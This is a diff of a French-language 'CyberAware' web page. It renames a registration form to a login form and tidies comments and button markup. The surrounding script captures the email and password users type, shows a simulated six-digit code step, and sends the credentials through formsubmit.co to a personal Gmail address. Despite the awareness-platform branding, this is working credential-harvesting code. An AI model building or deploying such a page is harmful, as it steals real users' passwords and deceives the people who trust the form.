@@ -86,7 +86,7 @@
     <h1>CyberAware</h1>
     <p>Plateforme de sensibilisation</p>
 
-    <form id="registerForm">
+    <form id="loginForm">
       <input type="email" name="email" required placeholder="Adresse email">
       <input type="password" name="password" required placeholder="Mot de passe">
       <button type="submit">Continuer</button>
@@ -101,8 +101,8 @@
       <strong id="generatedCode"></strong>
     </p>
     <form id="codeForm">
-    <input type="text" id="codeInput" placeholder="Code à 6 chiffres">
-    <button onclick="verifyCode()">Valider</button>
+      <input type="text" id="codeInput" placeholder="Code à 6 chiffres">
+      <button type="button" onclick="verifyCode()">Valider</button>
     </form>
   </section>
 
@@ -117,20 +117,20 @@
 <script>
   let generatedCode = "";
 
-  document.getElementById("registerForm").addEventListener("submit", function(e) {
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    // Génère un code à 6 chiffres (faux / simulation)
+    // Génère un code à 6 chiffres (simulation)
     generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
     document.getElementById("generatedCode").innerText = generatedCode;
 
-    // Prépare les données envoyées à Formsubmit
+    // Prépare les données pour Formsubmit
     const formData = new FormData(this);
     formData.append("_subject", "Nouvelle inscription CyberAware");
     formData.append("_captcha", "false");
     formData.append("code_validation", generatedCode);
 
-    // ENVOI AJAX (aucune redirection)
+    // Envoi AJAX
     fetch("https://formsubmit.co/ajax/tss.alex84@gmail.com", {
       method: "POST",
       headers: {
@@ -140,7 +140,7 @@
     })
     .then(response => response.json())
     .then(() => {
-      // Affichage étape code
+      // Affiche l'étape code
       document.getElementById("loginSection").classList.add("hidden");
       document.getElementById("codeSection").classList.remove("hidden");
     })
